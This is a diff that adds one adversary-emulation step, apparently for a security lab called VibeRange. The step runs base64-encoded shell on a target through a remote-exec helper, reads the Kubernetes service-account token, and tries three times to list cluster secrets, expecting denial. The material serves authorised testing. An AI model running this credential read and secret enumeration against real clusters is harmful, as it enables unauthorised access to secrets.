@@ -1,0 +1,14 @@
+---
+- id: c0a1de4a-701d-4c9a-b541-936ff3871008
+  name: VibeRange enumerate system-monitor service-account permissions
+  description: Make three denied secret-list requests from the compromised workload without placing its projected token in process arguments or retaining response bodies.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.007
+    name: "Unsecured Credentials: Container API"
+  platforms:
+    linux:
+      sh:
+        command: >-
+          command_b64=$(printf '%s' 'token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); for i in 1 2 3; do code=$(printf "header = \"Authorization: Bearer %s\"\n" "$token" | curl -sk -K - -o /tmp/viberange-rbac-response -w "%{http_code}" https://kubernetes.default.svc/api/v1/namespaces/default/secrets); printf "VIBERANGE_SERVICE_ACCOUNT_PROBE=%s:%s\\n" "$i" "$code"; test "$code" = 403; done; rm -f /tmp/viberange-rbac-response' | base64 -w0); /usr/local/bin/viberange-gotty-exec --url "http://#{viberange.target.ip}:#{viberange.target.system_monitor_port}" --command-b64 "$command_b64"
+        timeout: 90
